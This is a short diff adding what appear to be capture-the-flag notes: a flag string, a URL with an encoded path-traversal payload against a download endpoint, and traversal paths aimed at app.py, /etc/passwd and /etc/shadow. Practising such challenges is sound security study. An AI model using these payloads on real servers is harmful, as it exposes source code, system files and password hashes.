@@ -1,0 +1,9 @@
+FLAG{first_stzsbb123gfl_flag}
+
+
+http://62.173.140.174:36106/download?file=..%2F..%2Fetc%2Fflag.txt
+
+../app.py
+
+../../etc/passwd
+../../etc/shadow
